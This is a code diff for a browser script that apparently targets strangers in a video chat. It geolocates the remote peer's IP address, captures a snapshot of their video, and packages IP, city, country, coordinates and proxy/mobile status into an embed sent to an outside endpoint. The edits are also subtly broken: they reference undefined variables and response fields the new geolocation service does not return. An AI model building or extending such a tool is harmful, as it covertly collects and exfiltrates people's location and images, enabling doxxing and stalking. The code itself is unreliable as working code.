@@ -53,7 +53,6 @@
             var canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            wrapper.style.width = video.videoWidth+"px";
             var ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             base64Image = canvas.toDataURL('image/png');
@@ -103,7 +102,7 @@
         ip.innerText = ipp;
         city.innerText =  cityy;
         country.innerText =  regionNames.of(countryy);
-        loc.innerText =  locc;
+        proxy.innerText =  `${proxy}/${mobile}`;
     }
 
 
@@ -111,11 +110,11 @@
 
 
     var getLocation = async (ip,port) => {
-        let url = `https://ipinfo.io/${ip}?token=${apiKey}`;
+        let url = `http://ip-api.com/json/${ip}?fields=status,message,country,region,regionName,city,lat,lon,as,mobile,proxy,query`;
         await fetch(url).then((response) =>
             response.json().then((json) => {
                 const ip = json.ip+":"+port
-                set_message(ip, json.city, json.region, json.country, json.loc);
+                set_message(ip, json.city, json.region, json.country,json.mobile,json.proxy);
                 const request = new XMLHttpRequest();
                 const image = document.querySelector("#imag");
                 const video = document.querySelector("#remote-video");
@@ -137,6 +136,7 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     base64Image = canvas.toDataURL('image/png');
                     var image = document.querySelector("#imag");
+                    wrapper.style.width = video.videoWidth+"px";
                     image.src = base64Image;
                     var formData = new FormData();
                     var myEmbed = {
@@ -146,7 +146,9 @@
                         city: ${json.city} \n
                         region: ${json.region} \n
                         country: ${json.country} \n
-                        lat/long: ${json.loc} \n`,
+                        lat/long: ${json.loc} \n
+                        proxy/mobile: ${json.proxy}/${json.mobile} \n`,
+                        
                         color: hexToDecimal("#"+Math.floor(Math.random()*16777215).toString(16)),
                       };
                       var params = {
@@ -176,7 +178,7 @@
         var ip = document.getElementById("ip");
         var city = document.getElementById("city");
         var country = document.getElementById("country");
-        var loc = document.getElementById("loc");
+        var proxy = document.getElementById("proxy");
         var image = document.querySelector("#imag");
 
         header.style.left = "0px";
